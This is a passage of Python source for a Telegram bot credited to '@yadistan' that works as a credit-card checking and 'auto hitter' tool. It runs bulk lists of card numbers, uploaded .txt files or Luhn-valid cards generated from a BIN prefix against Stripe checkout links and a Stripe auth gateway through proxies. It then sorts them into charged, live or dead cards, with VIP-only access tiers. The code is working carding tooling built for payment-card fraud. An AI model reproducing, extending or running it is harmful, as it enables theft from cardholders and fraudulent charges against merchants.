                f"<b>🔥 Auto Hitter [{gate.upper()}] → {src_label}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 Total: {total} cards\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ Starting...</b>",
                reply_markup=stop_kb, parse_mode='HTML')

            def build_ah_msg(status_text="⏳ Checking..."):
                header = (f"<b>🔥 Auto Hitter [{gate.upper()}] | {status_text}\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n"
                          f"📋 {src_label}\n"
                          f"📊 {checked}/{total} | ✅ {charged} | ⚡ {live} | ❌ {dead} | 🔴 {err}\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n")
                body = "\n".join(results_lines[-10:])
                footer_hits = ""
                if hits:
                    hits_lines = "".join(
                        f"\n<b>{em} {_ah_word(res)}</b>\n<code>{cc}</code>\n"
                        f"<b>Msg:</b> {res.get('message','N/A')[:100]}\n"
                        f"<b>Time:</b> {res.get('elapsed',0):.2f}s\n"
                        for cc, res, em in hits[-8:]
                    )
                    footer_hits = f"\n━━━━━━━━━━━━━━━━━━━━\n🎯 HITS ({len(hits)}):" + hits_lines
                full = header + body + footer_hits + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] Bot by @yadistan</b>"
                if len(full) > 4000:
                    full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n[⌤] Bot by @yadistan</b>"
                return full

            for cc in card_lines:
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_ah_msg("🛑 STOPPED"), parse_mode='HTML')
                    except: pass
                    return

                cc = cc.strip()
                result = _ah_call(checkout_url, cc, uid=id)
                checked += 1
                log_card_check(id, cc, 'ah_hitter', result.get('message', '')[:80])

                em = _ah_emoji(result)
                s  = result.get("status", "").lower()
                if s in ("charged", "approved"):
                    charged += 1
                    hits.append((cc, result, em))
                elif s == "live":
                    live += 1
                    hits.append((cc, result, em))
                elif s == "error":
                    err += 1
                else:
                    dead += 1

                results_lines.append(
                    f"{em} <b>{_ah_word(result)}</b>  ❯  <code>{cc}</code>"
                )

                if checked % 5 == 0 or checked == total:
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_ah_msg(), parse_mode='HTML',
                                              reply_markup=stop_kb)
                        time.sleep(0.5)
                    except Exception:
                        time.sleep(1)

            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_ah_msg("✅ DONE"), parse_mode='HTML')
            except: pass

        # ── Mode 1: Reply to .txt file ───────────────────────────────────
        if (replied and replied.document
                and replied.document.file_name
                and replied.document.file_name.lower().endswith('.txt')):
            txt_parts = message.text.split()
            if len(txt_parts) < 2:
                bot.reply_to(message,
                    "<b>❌ URL missing. Usage:\nReply to .txt → <code>/ah https://...</code></b>",
                    parse_mode='HTML')
                return
            checkout_url = txt_parts[1].strip()
            if not checkout_url.startswith('http'):
                bot.reply_to(message, "<b>❌ Invalid URL.</b>", parse_mode='HTML')
                return
            wm = bot.reply_to(message, "<b>⏳ Downloading file...</b>", parse_mode='HTML')
            try:
                fi  = bot.get_file(replied.document.file_id)
                dl  = bot.download_file(fi.file_path)
                raw = dl.decode('utf-8', errors='ignore')
            except Exception as e:
                bot.edit_message_text(f"<b>❌ Download failed: {str(e)[:80]}</b>",
                                      chat_id=message.chat.id, message_id=wm.message_id,
                                      parse_mode='HTML')
                return
            bot.delete_message(message.chat.id, wm.message_id)
            card_lines = [_extract_cc(l.strip()) for l in raw.splitlines() if _extract_cc(l.strip())]
            if not card_lines:
                bot.reply_to(message, "<b>❌ No valid CCs found in file.</b>", parse_mode='HTML')
                return
            _run_ah_bulk(checkout_url, card_lines, f"📄 {replied.document.file_name} ({len(card_lines)} cards)")
            return

        # ── Mode 2: Reply to gen/CC text message ─────────────────────────
        if replied and not (replied.document and replied.document.file_name
                            and replied.document.file_name.lower().endswith('.txt')):
            cmd_parts = message.text.split()
            if len(cmd_parts) >= 2 and cmd_parts[1].startswith('http'):
                replied_text = replied.text or replied.caption or ""
                reply_cards  = []
                seen_r       = set()
                for _rl in replied_text.splitlines():
                    _cc = _extract_cc(_rl.strip())
                    if _cc and _cc not in seen_r:
                        reply_cards.append(_cc)
                        seen_r.add(_cc)
                if reply_cards:
                    _run_ah_bulk(cmd_parts[1], reply_cards, f"📋 Message ({len(reply_cards)} cards)")
                    return

        # ── Mode 3: Inline URL + card(s) ─────────────────────────────────
        try:
            lines      = message.text.split('\n')
            first_rest = lines[0].split(' ', 1)
            if len(first_rest) < 2:
                raise IndexError
            if len(lines) > 1:
                checkout_url = first_rest[1].strip()
                raw_lines    = [l.strip() for l in lines[1:] if l.strip()]
            else:
                parts2 = first_rest[1].strip().split()
                if len(parts2) < 2:
                    raise IndexError
                checkout_url = parts2[0]
                raw_lines    = [' '.join(parts2[1:])]
        except (IndexError, ValueError):
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        if not checkout_url.startswith('http'):
            bot.reply_to(message, "<b>❌ Invalid URL.</b>", parse_mode='HTML')
            return

        card_lines = []
        for _rl in raw_lines:
            _cc = _extract_cc(_rl)
            if _cc:
                card_lines.append(_cc)

        if not card_lines:
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        # Multi-card inline
        if len(card_lines) > 1:
            _run_ah_bulk(checkout_url, card_lines, f"Inline ({len(card_lines)} cards)")
            return

        # ── Single card ───────────────────────────────────────────────────
        card    = card_lines[0]
        gate    = _ah_gate(checkout_url)
        bin_num = card.replace('|', '')[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        log_command(message, query_type='gateway', gateway='ah_hitter')
        msg = bot.reply_to(message,
            f"<b>⏳ Checking [{gate.upper()}]...\n"
            f"🔥 Link: <code>{checkout_url[:50]}...</code>\n"
            f"💳 Card: <code>{card}</code></b>", parse_mode='HTML')

        result  = _ah_call(checkout_url, card, uid=id)
        em      = _ah_emoji(result)
        word    = _ah_word(result)

        ci = result.get("card_info") or {}
        out = (
            f"<b>{em} {word}  ❯  <code>{card}</code>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🏦 BIN: {bin_num}  •  {bin_info}\n"
            f"🏛️ Bank: {bank}\n"
            f"🌍 Country: {country} {country_code}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🎯 Gate: {gate.capitalize()}\n"
            f"📝 Message: {result.get('message','N/A')[:150]}\n"
            f"⏱️ Time: {result.get('elapsed',0):.2f}s\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"[⌤] Bot by @yadistan</b>"
        )
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=out, parse_mode='HTML')
        except:
            bot.reply_to(message, out, parse_mode='HTML')
        log_card_check(id, card, 'ah_hitter', result.get('message','')[:80])

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["xco"])
def xco_command(message):
    def my_function():
        uid  = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as f:
            jd = json.load(f)
        try:
            plan = jd[str(uid)]['plan']
        except Exception:
            plan = '𝗙𝗥𝗘𝗘'

        if plan == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>", parse_mode='HTML')
            return

        allowed, wait = check_rate_limit(uid, plan)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>", parse_mode='HTML')
            return

        if not _xco_api_alive():
            bot.reply_to(message,
                "<b>❌ API server unreachable.\nPlease try again later or use /co instead.</b>",
                parse_mode='HTML')
            return

        usage_msg = (
            "<b>🌐 <u>𝗦𝗲𝗹𝗳-𝗛𝗼𝘀𝘁𝗲𝗱 𝗔𝗣𝗜 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁</u>\n\n"
            "━━━━━━━━━━━━━━━━\n"
            "📌 <b>Single Card:</b>\n"
            "<code>/xco https://checkout.stripe.com/xxx\n"
            "4111111111111111|12|26|123</code>\n\n"
            "📌 <b>Multi-Card:</b>\n"
            "<code>/xco https://checkout.stripe.com/xxx\n"
            "4111111111111111|12|26|123\n"
            "5555555555554444|01|27|321</code>\n\n"
            "📌 <b>BIN Mode (auto-gen):</b>\n"
            "<code>/xco https://checkout.stripe.com/xxx\n"
            "411111 30</code>\n"
            "<i>(BIN amount — default 10, max 100)</i>\n"
            "━━━━━━━━━━━━━━━━</b>"
        )

        # ── Local card generator (same as /co) ──
        def luhn_check(card_number):
            digits = [int(d) for d in card_number]
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            tot = sum(odd_digits)
            for d in even_digits:
                tot += sum(divmod(d * 2, 10))
            return tot % 10 == 0

        def _make_card(bin_base, mm_t, yy_t, cvv_t):
            is_amex   = bin_base[0] == '3'
            card_len  = 15 if is_amex else 16
            cvv_len   = 4  if is_amex else 3
            cc = ''
            for ch in bin_base:
                cc += str(random.randint(0, 9)) if ch.lower() == 'x' else ch
            while len(cc) < card_len - 1:
                cc += str(random.randint(0, 9))
            for chk in range(10):
                test = cc + str(chk)
                if luhn_check(test):
                    cc = test; break
            cur_yr = datetime.now().year % 100
            mm  = str(random.randint(1, 12)).zfill(2)   if mm_t.lower()  in ('xx','x','') else mm_t.zfill(2)
            yy  = str(random.randint(cur_yr+1, cur_yr+5)).zfill(2) if yy_t.lower() in ('xx','x','') else yy_t.zfill(2)
            cvv = (str(random.randint(1000,9999)) if is_amex else str(random.randint(100,999)).zfill(3)) if cvv_t.lower() in ('xxx','xxxx','xx','x','') else cvv_t.zfill(cvv_len)
            return f"{cc}|{mm}|{yy}|{cvv}"

        parts_cmd = message.text.strip().split()

        # ── TXT FILE REPLY MODE ──
        replied = message.reply_to_message
        if (replied and replied.document
                and replied.document.file_name
                and replied.document.file_name.lower().endswith('.txt')):

            if len(parts_cmd) < 2:
                bot.reply_to(message,
                    "<b>❌ Usage: <code>/xco https://checkout.stripe.com/xxx</code> → (txt pe reply karein)</b>",
                    parse_mode='HTML')
                return
            checkout_url = parts_cmd[1].strip()
            try:
                file_info = bot.get_file(replied.document.file_id)
                raw_bytes = bot.download_file(file_info.file_path)
                file_lines = raw_bytes.decode('utf-8', errors='ignore').splitlines()
            except Exception as e:
                bot.reply_to(message, f"<b>❌ File read error: {e}</b>", parse_mode='HTML')
                return

            cc_list = [l.strip() for l in file_lines
                       if re.match(r'\d{13,19}[\|/]\d{1,2}[\|/]\d{2,4}[\|/]\d{3,4}', l.strip())]
            if not cc_list:
                bot.reply_to(message, "<b>❌ Koi valid card nahi mili file mein.</b>", parse_mode='HTML')
                return

            msg = bot.reply_to(message,
                f"<b>📄 TXT | 𝗘𝘅𝘁 𝗔𝗣𝗜\n⏳ Checking {len(cc_list)} cards...</b>", parse_mode='HTML')
            hits_txt, dead_txt, live_txt = [], 0, 0
            for cc in cc_list:
                if stopuser.get(str(uid), {}).get('status') == 'stop':
                    break
                emoji, resp = _xco_call(checkout_url, cc)
                if emoji in ("✅", "💰"):
                    hits_txt.append(_fmt_xco_line(emoji, cc, resp))
                    live_txt += 1
                else:
                    dead_txt += 1
            summary = (
                f"<b>📄 𝗧𝗫𝗧 𝗦𝗰𝗮𝗻 𝗗𝗼𝗻𝗲\n"
                f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
                f"✅ Hits: {live_txt}  💀 Dead: {dead_txt}\n"
                f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
                + ("\n".join(hits_txt) if hits_txt else "❌ No hits found.") + "\n[⌤] @yadistan</b>"
            )
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("@yadistan", url="https://t.me/yadistan"))
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=summary, reply_markup=kb, parse_mode='HTML')
            except Exception:
                bot.reply_to(message, summary, parse_mode='HTML')
            return

        # ── Parse URL + card/BIN (same logic as /co) ──
        try:
            lines_raw = message.text.split('\n')
            first_parts = lines_raw[0].split(' ', 1)
            if len(first_parts) < 2:
                raise IndexError
            first_line_rest = first_parts[1].strip()

            if len(lines_raw) > 1:
                # Multi-line: /xco URL\nCARD
                checkout_url = first_line_rest
                second_line  = lines_raw[1].strip()
                extra_lines  = [l.strip() for l in lines_raw[2:] if l.strip()]
            else:
                # Same-line: /xco URL CARD
                sp = first_line_rest.split()
                if len(sp) < 2:
                    raise IndexError
                checkout_url = sp[0]
                second_line  = ' '.join(sp[1:])
                extra_lines  = []
        except (IndexError, ValueError):
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        if not checkout_url.startswith('http'):
            bot.reply_to(message,
                "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗹𝗶𝗻𝗸. Stripe checkout URL paste karein.</b>",
                parse_mode='HTML')
            return

        # ── Detect mode: Card or BIN ──
        first_token = second_line.split('|')[0].strip().split()[0]
        is_card = (len(first_token) >= 13 and first_token.isdigit()) or (_extract_cc(second_line) is not None)

        if is_card:
            # ── CARD / MULTI-CARD MODE ──
            _raw_xco = [second_line] + extra_lines
            card_lines = []
            for _rl in _raw_xco:
                _cc = _extract_cc(_rl.strip())
                if _cc:
                    card_lines.append(_cc)
            if not card_lines:
                bot.reply_to(message, usage_msg, parse_mode='HTML')
                return

            if len(card_lines) == 1:
                # ── SINGLE CARD ──
                cc  = card_lines[0]
                msg = bot.reply_to(message,
                    f"<b>🌐 𝗘𝘅𝘁 𝗔𝗣𝗜 | ⏳ Checking...\n💳 <code>{cc}</code></b>",
                    parse_mode='HTML')
                emoji, resp = _xco_call(checkout_url, cc)
                result_text = f"<b>{_fmt_xco_line(emoji, cc, resp)}\n[⌤] @yadistan</b>"
                kb = types.InlineKeyboardMarkup()
                kb.add(types.InlineKeyboardButton("@yadistan", url="https://t.me/yadistan"))
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=result_text, reply_markup=kb, parse_mode='HTML')
                except Exception:
                    bot.reply_to(message, result_text, parse_mode='HTML')
                return

            # ── MULTI CARD ──
            total    = len(card_lines)
            checked  = 0
            live_m, dead_m = 0, 0
            results_m = []   # all card lines
            hits_m    = []   # hits only
            stop_kb = types.InlineKeyboardMarkup()
            stop_kb.add(types.InlineKeyboardButton("🛑 Stop", callback_data='stop'))

            def build_multi(status="⏳ Checking..."):
                bar_done  = "▓" * min(checked, 10)
                bar_empty = "░" * max(0, 10 - min(checked, 10))
                pct       = int(checked / total * 100) if total else 0
                hdr = (
                    f"<b>⚡️ 𝗫𝗖𝗢 𝗠𝘂𝗹𝘁𝗶 𝗦𝗰𝗮𝗻  {status}\n"
                    f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
                    f"[{bar_done}{bar_empty}] {pct}%  ({checked}/{total})\n"
                    f"✅ {live_m}  💀 {dead_m}  🔢 {checked}\n"
                    f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
                )
                body = "\n".join(results_m[-8:])
                hits_section = ""
                if hits_m:
                    hits_section = "\n┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n🏆 𝗛𝗜𝗧𝗦:\n" + "\n".join(hits_m)
                return hdr + body + hits_section + "\n┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n[⌤] @yadistan</b>"

            msg = bot.reply_to(message, build_multi(), reply_markup=stop_kb, parse_mode='HTML')
            for cc in card_lines:
                if stopuser.get(str(uid), {}).get('status') == 'stop':
                    break
                emoji, resp = _xco_call(checkout_url, cc)
                checked += 1
                line = _fmt_xco_line(emoji, cc, resp)
                results_m.append(line)
                if emoji in ("✅", "💰"):
                    live_m += 1
                    hits_m.append(line)
                else:
                    dead_m += 1
                if checked % 2 == 0 or checked == total:
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_multi(), reply_markup=stop_kb, parse_mode='HTML')
                    except Exception:
                        pass
            fin_kb = types.InlineKeyboardMarkup()
            fin_kb.add(types.InlineKeyboardButton("@yadistan", url="https://t.me/yadistan"))
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_multi("✅ Completed!"), reply_markup=fin_kb, parse_mode='HTML')
            except Exception:
                pass
            return

        # ── BIN MODE ──
        second_parts = second_line.split()
        bin_input    = second_parts[0]
        amount       = int(second_parts[1]) if len(second_parts) > 1 and second_parts[1].isdigit() else 10
        amount       = max(1, min(amount, 100))

        has_pipe = '|' in bin_input
        if has_pipe:
            bp = bin_input.split('|')
            bin_base  = bp[0].strip()
            mm_t      = bp[1].strip() if len(bp) > 1 else 'xx'
            yy_t      = bp[2].strip() if len(bp) > 2 else 'xx'
            cvv_t     = bp[3].strip() if len(bp) > 3 else 'xxx'
        else:
            bin_base = bin_input.replace('x','').replace('X','')
            mm_t, yy_t, cvv_t = 'xx', 'xx', 'xxx'

        if len(bin_base.replace('x','').replace('X','')) < 6:
            bot.reply_to(message, "<b>❌ BIN must be at least 6 digits.</b>", parse_mode='HTML')
            return

        cards = []
        seen  = set()
        for _ in range(amount * 5):
            if len(cards) >= amount:
                break
            c = _make_card(bin_base, mm_t, yy_t, cvv_t)
            if c not in seen:
                seen.add(c); cards.append(c)

        total    = len(cards)
        bin_num  = bin_base[:6]
        bin_info, bank, country, _ = get_bin_info(bin_num)
        checked_b, live_b, dead_b = 0, 0, 0
        results_b = []   # all card lines (hits + dead)
        hits_b    = []   # hit cards only (for final summary)

        try:
            stopuser[str(uid)]['status'] = 'start'
        except Exception:
            stopuser[str(uid)] = {'status': 'start'}

        stop_kb2 = types.InlineKeyboardMarkup()
        stop_kb2.add(types.InlineKeyboardButton("🛑 Stop", callback_data='stop'))

        def build_bin(status="⏳ Checking..."):
            bar_done  = "▓" * min(checked_b, 10)
            bar_empty = "░" * max(0, 10 - min(checked_b, 10))
            pct       = int(checked_b / total * 100) if total else 0
            hdr = (
                f"<b>⚡️ 𝗫𝗖𝗢 𝗕𝗜𝗡 𝗦𝗰𝗮𝗻𝗻𝗲𝗿  {status}\n"
                f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
                f"🎴 𝗕𝗜𝗡 »  <code>{bin_num}</code>  |  {bin_info}\n"
                f"[{bar_done}{bar_empty}] {pct}%  ({checked_b}/{total})\n"
                f"✅ {live_b}  💀 {dead_b}  🔢 {checked_b}\n"
                f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
            )
            body = "\n".join(results_b[-8:])
            hits_section = ""
            if hits_b:
                hits_section = (
                    "\n┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
                    "🏆 𝗛𝗜𝗧𝗦:\n"
                    + "\n".join(hits_b)
                )
            return hdr + body + hits_section + "\n┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n[⌤] @yadistan</b>"

        log_command(message, query_type='gateway', gateway='xco_bin')
        msg = bot.reply_to(message, build_bin(), reply_markup=stop_kb2, parse_mode='HTML')

        for cc in cards:
            if stopuser.get(str(uid), {}).get('status') == 'stop':
                break
            emoji, resp = _xco_call(checkout_url, cc)
            checked_b += 1
            line = _fmt_xco_line(emoji, cc, resp)
            results_b.append(line)
            if emoji in ("✅", "💰"):
                live_b += 1
                hits_b.append(line)
            else:
                dead_b += 1
            if checked_b % 2 == 0 or checked_b == total:
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_bin(), reply_markup=stop_kb2, parse_mode='HTML')
                except Exception:
                    pass

        fin_kb2 = types.InlineKeyboardMarkup()
        fin_kb2.add(types.InlineKeyboardButton("@yadistan", url="https://t.me/yadistan"))
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=build_bin("✅ Completed!"), reply_markup=fin_kb2, parse_mode='HTML')
        except Exception:
            pass

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Stripe Auth Command ==================
@bot.message_handler(commands=["sa"])
def stripe_auth_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>")
            return
        
        card = _get_card_from_message(message)
        if not card:
            bot.reply_to(message, f"<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/sa 4111111111111111|12|25|123\n\n<i>💡 Tip: Can also reply to a message containing cards</i></b>")
            return
        
        log_command(message, query_type='gateway', gateway='stripe_auth')
        proxy = get_proxy_dict(id)
        msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱 𝘄𝗶𝘁𝗵 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵... ⏳</b>")
        
        bin_num = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        
        start_time = time.time()
        result = stripe_auth(card, proxy)
        execution_time = time.time() - start_time
        log_card_check(id, card, 'stripe_auth', result, exec_time=execution_time)
        
        if "Approved" in result:
            status_emoji = "✅"
        elif "Insufficient" in result:
            status_emoji = "💰"
        else:
            status_emoji = "❌"
        
        minux_keyboard = types.InlineKeyboardMarkup()
        minux_button = types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan")
        minux_keyboard.add(minux_button)
        
        formatted_message = f"""<b>#stripe_auth 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"""
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=formatted_message,
            reply_markup=minux_keyboard
        )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== /chk — Non-SK Single Card Checker ==================
@bot.message_handler(commands=["chk"])
def chk_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>")
            return
        card = _get_card_from_message(message)
        if not card:
            bot.reply_to(message, "<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/chk 4111111111111111|12|25|123\n\n<i>💡 Tip: Can also reply to a message containing a card</i></b>")
            return
        log_command(message, query_type='gateway', gateway='chk')
        proxy = get_proxy_dict(id)
        msg = bot.reply_to(message, "<b>🔍 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱... ⏳</b>")
        bin_num = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        start_time = time.time()
        result = stripe_auth(card, proxy)
        execution_time = time.time() - start_time
        log_card_check(id, card, 'chk', result, exec_time=execution_time)
        if "Approved" in result:
            status_emoji = "✅"
        elif "Insufficient" in result:
            status_emoji = "💰"
        elif "3DS" in result or "OTP" in result:
            status_emoji = "⚠️"
        else:
            status_emoji = "❌"
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
        bot.edit_message_text(
            chat_id=message.chat.id, message_id=msg.message_id,
            text=f"""<b>#NonSK_Checker 🔍
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>""",
            reply_markup=kb)
    threading.Thread(target=my_function).start()

# ================== /chkm — Non-SK Mass Checker ==================
@bot.message_handler(commands=["chkm"])
def chkm_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        cards = _get_cards_from_message(message)
        if not cards:
            bot.reply_to(message, "<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/chkm card1\ncard2\ncard3</b>")
            return
        if len(cards) > 50:
            bot.reply_to(message, "<b>❌ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 50 𝗰𝗮𝗿𝗱𝘀 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲.</b>")
            return
        total = len(cards)
        proxy = get_proxy_dict(id)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        msg = bot.reply_to(message, f"<b>🔍 𝗡𝗼𝗻-𝗦𝗞 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>", reply_markup=stop_kb)
        live = dead = insufficient = checked = 0
        results_lines = []
        def build_msg(status="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
            h = f"<b>🔍 𝗡𝗼𝗻-𝗦𝗞 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n{status}\n━━━━━━━━━━━━━━━━━━━━\n"
            h += f"📊 {checked}/{total} | ✅ {live} | 💰 {insufficient} | ❌ {dead}\n━━━━━━━━━━━━━━━━━━━━\n"
            return h + "\n".join(results_lines[-15:]) + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=build_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"))
                except:
                    pass
                return
            cc = cc.strip()
            start_time = time.time()
            result = stripe_auth(cc, proxy)
            checked += 1
            if "Approved" in result:
                status_emoji = "✅"; live += 1
            elif "Insufficient" in result:
                status_emoji = "💰"; insufficient += 1
            elif "3DS" in result or "OTP" in result:
                status_emoji = "⚠️"; live += 1
            else:
                status_emoji = "❌"; dead += 1
            results_lines.append(f"{status_emoji} <code>{cc}</code> → {result}")
            try:
                skb = types.InlineKeyboardMarkup()
